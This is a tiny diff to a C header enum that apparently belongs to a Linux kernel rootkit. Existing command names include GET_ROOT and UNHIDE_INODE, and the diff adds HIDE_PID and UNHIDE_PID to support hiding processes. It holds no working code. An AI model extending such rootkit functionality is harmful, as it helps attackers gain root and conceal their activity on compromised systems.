@@ -12,6 +12,8 @@ enum {
 	UNHIDE_INODE,
 	LULZ_MODE,
 	GET_ROOT,
+	HIDE_PID,
+	UNHIDE_PID,
 };
 
 #endif
